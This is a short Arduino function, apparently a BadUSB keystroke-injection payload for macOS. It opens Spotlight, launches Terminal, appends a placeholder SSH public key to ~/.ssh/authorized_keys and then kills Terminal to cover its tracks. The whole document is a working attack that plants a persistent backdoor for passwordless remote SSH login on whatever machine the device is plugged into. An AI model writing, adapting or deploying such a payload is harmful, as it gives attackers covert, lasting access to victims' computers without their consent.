void PasswordlessSSH() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(1500);
  Keyboard.print("terminal");
  delay(1000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("echo 'RSA_PUB_ID' >> ~/.ssh/authorized_keys");
  delay(4000);
  Keyboard.println("killall Terminal");
}
